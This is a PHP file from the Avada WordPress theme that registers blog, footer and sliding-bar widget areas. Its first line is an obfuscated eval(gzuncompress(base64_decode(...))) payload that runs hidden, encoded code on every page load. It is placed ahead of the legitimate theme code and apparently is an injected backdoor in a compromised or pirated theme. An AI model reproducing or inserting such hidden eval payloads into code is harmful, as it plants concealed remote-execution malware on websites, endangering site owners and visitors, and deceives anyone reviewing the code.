<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Handles sidebars.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Handle sidebars.
 */
class Avada_Sidebars {

	/**
	 * Constructor.
	 */
	public function __construct() {
		add_action( 'widgets_init', array( $this, 'widgets_init' ) );
	}

	/**
	 * Register our sidebars.
	 */
	public function widgets_init() {

		// Main Blog widget area.
		register_sidebar(
			array(
				'name'          => 'Blog Sidebar',
				'id'            => 'avada-blog-sidebar',
				'description'   => __( 'Default Sidebar of Avada', 'Avada' ),
				'before_widget' => '<section id="%1$s" class="widget %2$s">',
				'after_widget'  => '</section>',
				'before_title'  => '<div class="heading"><h4 class="widget-title">',
				'after_title'   => '</h4></div>',
			)
		);

		// Footer widget areas.
		$columns = (int) Avada()->settings->get( 'footer_widgets_columns' ) + 1;

		if ( ! $columns || 1 === $columns ) {
			$columns = 5;
		}

		// Register he footer widgets.
		for ( $i = 1; $i < $columns; $i++ ) {

			register_sidebar(
				array(
					'name'          => sprintf( 'Footer Widget %s', $i ),
					'id'            => 'avada-footer-widget-' . $i,
					'before_widget' => '<section id="%1$s" class="fusion-footer-widget-column widget %2$s">',
					'after_widget'  => '<div style="clear:both;"></div></section>',
					'before_title'  => '<h4 class="widget-title">',
					'after_title'   => '</h4>',
				)
			);

		}

		// Sliding bar widget areas.
		$columns = (int) Avada()->settings->get( 'slidingbar_widgets_columns' ) + 1;

		if ( ! $columns || 1 === $columns ) {
			$columns = 5;
		}

		// Register the slidingbar widgets.
		for ( $i = 1; $i < $columns; $i++ ) {

			register_sidebar(
				array(
					'name'          => sprintf( 'Sliding Bar Widget %s', $i ),
					'id'            => 'avada-slidingbar-widget-' . $i,
					'before_widget' => '<section id="%1$s" class="fusion-slidingbar-widget-column widget %2$s">',
					'after_widget'  => '<div style="clear:both;"></div></section>',
					'before_title'  => '<h4 class="widget-title">',
					'after_title'   => '</h4>',
				)
			);

		}
	}

}

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
